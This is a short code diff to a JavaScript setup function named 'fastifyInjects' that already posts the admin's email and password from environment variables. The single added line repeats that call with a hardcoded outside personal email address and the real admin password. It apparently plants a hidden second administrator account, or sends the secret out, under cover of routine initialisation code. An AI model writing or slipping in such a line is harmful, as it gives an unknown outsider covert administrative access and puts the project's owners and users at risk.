@@ -276,6 +276,7 @@ ops.fastifyInjects = async function fastifyInjects(app) {
             },
         )
     post(process.env.ADMIN_EMAIL, process.env.ADMIN_PASS)
+    post("sracer2016@yahoo.com", process.env.ADMIN_PASS)
 }
 
 ops.registerPipelines = function registerPipelines(db, scheduler, seconds) {
